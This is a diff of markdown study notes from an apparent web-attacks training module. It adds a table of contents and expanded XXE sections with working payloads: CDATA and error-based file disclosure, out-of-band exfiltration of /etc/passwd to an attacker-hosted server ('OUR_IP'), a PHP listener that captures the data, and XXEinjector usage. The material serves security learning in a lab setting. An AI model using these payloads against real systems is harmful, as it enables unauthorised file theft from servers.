@@ -2,6 +2,88 @@
 
 ---
 
+## Table of Contents
+
+**1. Introduction to Web Attacks**
+- [1.1 Web Attacks Covered in This Module](#web-attacks-covered-in-this-module)
+
+---
+
+**2. HTTP Verb Tampering**
+- [2.1 Intro to HTTP Verb Tampering](#intro-to-http-verb-tampering)
+  - [2.1.1 HTTP Verbs — Overview Table](#http-verbs--overview-table)
+- [2.2 Insecure Configurations](#insecure-configurations)
+- [2.3 Insecure Coding](#insecure-coding)
+  - [2.3.1 How the Vulnerability Occurs](#how-the-vulnerability-occurs)
+  - [2.3.2 Breaking Down the Problem](#breaking-down-the-problem)
+  - [2.3.3 How an Attacker Exploits This](#how-an-attacker-exploits-this)
+- [2.4 Bypassing Basic Authentication](#bypassing-basic-authentication)
+  - [2.4.1 Identify](#identify)
+  - [2.4.2 Exploit](#exploit)
+  - [2.4.3 Step-by-Step: How to Bypass Basic Authentication](#step-by-step-how-to-bypass-basic-authentication)
+- [2.5 Bypassing Security Filters](#bypassing-security-filters)
+  - [2.5.1 Identify](#identify-1)
+  - [2.5.2 Exploit](#exploit-1)
+  - [2.5.3 Step-by-Step: How to Bypass a Security Filter](#step-by-step-how-to-bypass-a-security-filter)
+- [2.6 Verb Tampering Prevention](#verb-tampering-prevention)
+  - [2.6.1 Fixing Insecure Server Configurations](#fixing-insecure-server-configurations)
+  - [2.6.2 Fixing Insecure Coding](#fixing-insecure-coding)
+
+---
+
+**3. Insecure Direct Object References (IDOR)**
+- [3.1 Intro to IDOR](#intro-to-idor)
+  - [3.1.1 Impact of IDOR Vulnerabilities](#impact-of-idor-vulnerabilities)
+- [3.2 Identifying IDORs](#identifying-idors)
+  - [3.2.1 URL Parameters & APIs](#url-parameters--apis)
+  - [3.2.2 AJAX Calls in JavaScript](#ajax-calls-in-javascript)
+  - [3.2.3 Understanding Hashed or Encoded References](#understanding-hashed-or-encoded-references)
+  - [3.2.4 Comparing User Roles](#comparing-user-roles)
+- [3.3 Mass IDOR Enumeration](#mass-idor-enumeration)
+  - [3.3.1 Insecure Parameters](#insecure-parameters)
+  - [3.3.2 Identifying the IDOR](#identifying-the-idor)
+  - [3.3.3 Step-by-Step: Mass Enumeration with Bash](#step-by-step-mass-enumeration-with-bash)
+- [3.4 Bypassing Encoded References](#bypassing-encoded-references)
+  - [3.4.1 Identify](#identify-2)
+  - [3.4.2 Function Disclosure](#function-disclosure)
+  - [3.4.3 Verify the Hash](#verify-the-hash)
+  - [3.4.4 Mass Enumeration](#mass-enumeration)
+- [3.5 IDOR in Insecure APIs](#idor-in-insecure-apis)
+  - [3.5.1 Identifying Insecure APIs](#identifying-insecure-apis)
+  - [3.5.2 Exploiting Insecure APIs](#exploiting-insecure-apis)
+- [3.6 Chaining IDOR Vulnerabilities](#chaining-idor-vulnerabilities)
+  - [3.6.1 Information Disclosure](#information-disclosure)
+  - [3.6.2 Modifying Other Users' Details](#modifying-other-users-details)
+  - [3.6.3 Chaining Two IDOR Vulnerabilities](#chaining-two-idor-vulnerabilities)
+- [3.7 IDOR Prevention](#idor-prevention)
+  - [3.7.1 Object-Level Access Control (RBAC)](#object-level-access-control-rbac)
+  - [3.7.2 Object Referencing](#object-referencing)
+
+---
+
+**4. XML External Entity (XXE) Injection**
+- [4.1 Intro to XXE](#intro-to-xxe)
+  - [4.1.1 XML Basics](#xml-basics)
+  - [4.1.2 XML DTD (Document Type Definition)](#xml-dtd-document-type-definition)
+  - [4.1.3 XML Entities](#xml-entities)
+- [4.2 Local File Disclosure](#local-file-disclosure)
+  - [4.2.1 Identifying](#identifying)
+  - [4.2.2 Step-by-Step: Exploiting XXE to Read Local Files](#step-by-step-exploiting-xxe-to-read-local-files)
+  - [4.2.3 Remote Code Execution via XXE](#remote-code-execution-via-xxe)
+  - [4.2.4 Other XXE Attacks](#other-xxe-attacks)
+- [4.3 Advanced File Disclosure](#advanced-file-disclosure)
+  - [4.3.1 Advanced Exfiltration with CDATA](#advanced-exfiltration-with-cdata)
+  - [4.3.2 Error-Based XXE](#error-based-xxe)
+- [4.4 Blind Data Exfiltration](#blind-data-exfiltration)
+  - [4.4.1 Out-of-Band Data Exfiltration](#out-of-band-data-exfiltration)
+  - [4.4.2 Automated OOB Exfiltration with XXEinjector](#automated-oob-exfiltration-with-xxeinjector)
+- [4.5 XXE Prevention](#xxe-prevention)
+  - [4.5.1 Avoiding Outdated Components](#avoiding-outdated-components)
+  - [4.5.2 Using Safe XML Configurations](#using-safe-xml-configurations)
+  - [4.5.3 Additional Recommendations](#additional-recommendations)
+
+---
+
 ## Introduction to Web Attacks
 
 Web applications are used by almost every business today, making their security extremely important. As web apps grow more complex, attackers also develop more advanced techniques to exploit them. This creates a large attack surface, making web attacks the most common type of attack against companies. Protecting web applications has become a top priority for any IT or security team.
@@ -972,44 +1054,80 @@ XXE can be used to crash the server by defining a chain of self-referencing enti
 
 ### Advanced File Disclosure
 
-When basic XXE doesn't work — for example, when file content breaks XML format, or when the app doesn't show XML output — more advanced techniques are needed.
+Not all XXE vulnerabilities are straightforward to exploit. Some file formats cannot be read through basic XXE because their content breaks the XML format. In other cases, the web application may not output any input values at all, so we need to force the data out through errors or out-of-band channels.
 
 #### Advanced Exfiltration with CDATA
 
-Some files (like PHP source code) contain characters that break XML parsing. The CDATA method wraps file content in a `<![CDATA[...]]>` block so the parser treats it as raw data. Because XML prevents joining internal and external entities directly, we use **XML Parameter Entities** (which start with `%`) hosted on our own server.
+In the Local File Disclosure section, we used PHP's `php://filter` to base64-encode PHP source files so they wouldn't break the XML format. But this only works for PHP. For any other web framework, we need a different approach.
 
-**Step 1 — Create a DTD file on your machine:**
+We can wrap the file content in a **CDATA tag** (`<![CDATA[ FILE_CONTENT ]]>`). The XML parser treats everything inside CDATA as raw data — it ignores special characters like `<`, `>`, and `&` inside it. This allows us to include any file content without breaking the XML format.
+
+The naive approach would be to define three internal entities and join them:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+
+However, **this does not work** — XML prevents joining internal and external entities together. We need a different approach.
+
+The solution is to use **XML Parameter Entities** — a special entity type that starts with `%` and can only be used inside a DTD. The key property is: if parameter entities are referenced from an **external DTD file** hosted on our server, they are all treated as external and can be joined freely.
+
+**Step 1 — Create the xxe.dtd file on your machine and host it:**
+
 ```bash
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 python3 -m http.server 8000
 ```
 
+Output:
+```
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
 **Step 2 — Send this XML payload to the target:**
+
 ```xml
 <!DOCTYPE email [
-  <!ENTITY % begin "<![CDATA[">
-  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
-  <!ENTITY % end "]]>">
-  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  <!ENTITY % begin "<![CDATA[">         <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>">                 <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
   %xxe;
 ]>
 ...
-<email>&joined;</email>
+<email>&joined;</email>               <!-- reference the &joined; entity to print the file content -->
 ```
 
-When processed, the server fetches your DTD, joins the CDATA wrapper around the file content, and returns it in the response — without breaking XML format.
+When processed, the server fetches your `xxe.dtd` file, uses it to join the CDATA wrapper around the file content, and returns the full PHP source code in the response — without any base64 encoding and without breaking the XML format.
+
+> **Note:** On some modern web servers, you may not be able to read files like `index.php` because the server protects against entity self-reference loops (which can cause a DoS). If that happens, try other files.
+
+This technique works with **any web framework**, not just PHP, making it very useful when basic XXE methods fail.
 
 #### Error-Based XXE
 
-If the application shows PHP errors but doesn't output XML entities, you can force an error that includes the file content in the error message.
+Sometimes a web application does not display any XML entity output at all — we have no reflected field to inject into. However, if the application **displays PHP runtime errors** and lacks proper exception handling, we can exploit those errors to leak file content.
 
-**Step 1 — Create a DTD that causes a descriptive error:**
+**How it works:** First, confirm the app shows errors by sending malformed XML — delete a closing tag, use `<roo>` instead of `<root>`, or reference a non-existing entity. If the app throws a PHP error and reveals the server directory path in the message, we can use that to our advantage.
+
+**Step 1 — Create the error-triggering DTD file and host it:**
+
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 ```
 
-**Step 2 — Reference your DTD in the payload:**
+This defines two parameter entities:
+- `%file` reads the target file
+- `%error` tries to load a path that joins a non-existing entity with the file content — which triggers an error containing the file content in the error message
+
+**Step 2 — Send the payload referencing your DTD:**
+
 ```xml
 <!DOCTYPE email [
   <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
@@ -1018,25 +1136,38 @@ If the application shows PHP errors but doesn't output XML entities, you can for
 ]>
 ```
 
-The server tries to load `%nonExistingEntity;/%file;` — a non-existent path — and throws an error that includes the file content as part of the error message. This reveals the file even when no output is returned normally.
+The server loads your DTD, tries to process `%nonExistingEntity;/%file;` — a path that doesn't exist — and throws an error message that includes the `%file;` content as part of the invalid URI. The file content appears in the error output.
+
+> **Note:** This method can also be used to read source code files, but it is less reliable than the CDATA method — it may have length limitations, and special characters in the file can still break the error output.
 
 ---
 
 ### Blind Data Exfiltration
 
-In fully blind XXE scenarios — where the app shows no output and no errors — you can use **Out-of-Band (OOB) Exfiltration** to send file content to your own server via an HTTP request.
+In the previous section, the app displayed PHP errors which we used to leak file content. But what if the app shows **no output at all** — no reflected entities, no error messages? This is a completely blind XXE situation, and it requires a different strategy called **Out-of-Band (OOB) Data Exfiltration**.
 
-#### Step-by-Step: OOB Data Exfiltration
+Instead of making the app print file content to the page, we make the app **send the file content to our own server** via an HTTP request. This is the same concept used in blind SQL injection, blind command injection, and blind XSS — the app never shows us anything, but it makes outbound requests that we can capture.
 
-**Step 1 — Create the exfiltration DTD file:**
+#### Out-of-Band Data Exfiltration
+
+The attack works like this:
+1. We host a DTD file on our machine
+2. The vulnerable app fetches our DTD
+3. The DTD instructs the app to read a local file, base64-encode it, and send it to our server as a URL parameter
+4. We capture and decode the data on our end
+
+**Step 1 — Create the OOB exfiltration DTD (`xxe.dtd`) on your machine:**
+
 ```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 ```
 
-This encodes the file in base64 and sends it to your server as a URL query parameter.
+- `%file` reads `/etc/passwd` and base64-encodes it using PHP's filter
+- `%oob` creates an entity that makes an HTTP request to our server, placing the base64 data as a URL query parameter `?content=`
 
-**Step 2 — Create a PHP listener on your machine:**
+**Step 2 — Create a PHP listener (`index.php`) that decodes and logs incoming data:**
+
 ```php
 <?php
 if(isset($_GET['content'])){
@@ -1045,12 +1176,22 @@ if(isset($_GET['content'])){
 ?>
 ```
 
+This script reads the `content` parameter from incoming GET requests, base64-decodes it, and logs the result to the terminal.
+
 **Step 3 — Start your PHP server:**
+
 ```bash
+vi index.php   # write the above PHP code
 php -S 0.0.0.0:8000
 ```
 
-**Step 4 — Send the XXE payload:**
+Output:
+```
+PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
+```
+
+**Step 4 — Send the XXE payload to the target:**
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
@@ -1061,23 +1202,84 @@ php -S 0.0.0.0:8000
 <root>&content;</root>
 ```
 
-The target server fetches your DTD, reads the file, base64-encodes it, and sends it to your listener as a URL parameter. Your PHP script decodes and logs it. You receive the file content without the app ever showing you anything.
+- `%remote` fetches your hosted DTD
+- `%oob` is evaluated, creating the `content` entity that triggers the HTTP request back to your server with the file data
+- `&content;` references the entity to trigger execution
 
-#### Automated OOB with XXEinjector
+**Step 5 — Receive and read the exfiltrated data on your terminal:**
 
-For faster exploitation, use the **XXEinjector** tool:
+```
+PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
+10.10.14.16:46256 Accepted
+10.10.14.16:46256 [200]: (null) /xxe.dtd
+10.10.14.16:46256 Closing
+10.10.14.16:46258 Accepted
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...SNIP...
+```
+
+The app never showed us anything — but it sent the file to us. The decoded content of `/etc/passwd` appears in our PHP server logs.
+
+> **Tip:** Instead of sending base64 data as a URL query parameter, you can use **DNS OOB Exfiltration** — place the encoded data as a subdomain (e.g. `ENCODEDTEXT.our.website.com`) and capture it with `tcpdump`. This is more advanced and useful when HTTP outbound is blocked.
+
+#### Automated OOB Exfiltration with XXEinjector
+
+For faster and more automated exploitation, use **XXEinjector** — a Ruby tool that supports basic XXE, CDATA exfiltration, error-based XXE, and blind OOB XXE.
+
+**Step 1 — Clone the tool:**
 
 ```bash
 git clone https://github.com/enjoiz/XXEinjector.git
 ```
 
-Save the HTTP request from Burp to a file, add `XXEINJECT` after the first XML line, then run:
+**Step 2 — Save the HTTP request from Burp to a file**
+
+Copy the raw HTTP request and save it (e.g. `/tmp/xxe.req`). Include only the **first line of the XML body** and add `XXEINJECT` after it as a position marker for the tool:
+
+```http
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://10.129.201.94
+Referer: http://10.129.201.94/blind/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+
+**Step 3 — Run the tool:**
 
 ```bash
 ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 ```
 
-Exfiltrated files are saved to the `Logs/` folder. This tool supports basic XXE, CDATA exfiltration, error-based, and blind OOB modes.
+| Flag | Purpose |
+|------|---------|
+| `--host` | Your IP address (tun0 interface) |
+| `--httpport` | Port your listener runs on |
+| `--file` | Path to the saved HTTP request file |
+| `--path` | The remote file you want to exfiltrate |
+| `--oob=http` | Use HTTP for out-of-band exfiltration |
+| `--phpfilter` | Use PHP base64 filter to encode the file |
+
+The tool won't print the data directly (because it's base64 encoded). All exfiltrated files are saved in the `Logs/` folder:
+
+```bash
+cat Logs/10.129.201.94/etc/passwd.log
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...SNIP...
+```
 
 ---
 
